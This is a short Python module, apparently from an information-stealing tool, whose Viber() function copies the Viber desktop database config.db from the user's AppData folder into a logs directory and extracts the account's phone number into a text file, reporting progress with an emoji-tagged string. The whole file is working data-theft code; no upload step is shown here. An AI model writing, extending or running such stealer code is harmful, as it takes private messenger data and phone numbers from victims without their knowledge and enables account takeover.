from os import listdir,makedirs,environ
from os.path import join
from shutil import copy2
from manager.logger import Log
from preferences.config import config


def Viber():
    msgInfo = ""
    try:
        path = "ViberPC"
        roaming = environ["APPDATA"]
        pathToLogs = join(config.pathToLogs, "Messengers", "Viber")
        makedirs(pathToLogs, exist_ok=True)
        copy2(join(roaming, path, "config.db"), pathToLogs)
        dirs = listdir(join(roaming, path))
        for filename in dirs:
            if (filename.isdigit()):
                with open(join(pathToLogs, "phoneNumber.txt"), "a", encoding="utf-8") as num:
                    num.write("+"+filename)
        msgInfo+="\n∟📨Viber"
        return msgInfo
    except Exception as e:
        Log(f"Viber ---> {e}")
        return msgInfo